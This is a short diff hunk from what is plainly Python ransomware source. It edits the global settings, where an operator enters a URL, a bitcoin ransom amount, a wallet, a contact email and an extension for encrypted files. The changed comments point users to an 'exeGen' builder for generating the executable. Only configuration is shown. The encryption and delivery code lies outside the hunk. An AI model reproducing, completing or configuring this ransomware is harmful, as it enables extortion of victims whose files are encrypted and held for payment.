@@ -22,11 +22,11 @@ uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "")
 
 # some GLOBALS
 
-URL = ""                        # <----  REQUIRED
-BTC_AMOUNT = ""                 # <----  REQUIRED
-BTC_WALLET = ""                 # <----  REQUIRED
-EMAIL = ""                      # <----  REQUIRED
-EXT = ".cryptn8"                # <----  OPTIONAL
+URL = ""                        # <----  REQUIRED (Use exeGen.. It is much easier)
+BTC_AMOUNT = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
+BTC_WALLET = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
+EMAIL = ""                      # <----  REQUIRED (Use exeGen.. It is much easier)
+EXT = ".cryptn8"                # <----  OPTIONAL (Use exeGen.. It is much easier)
 
 
 fileLists = []      # stores the files to be encrypted
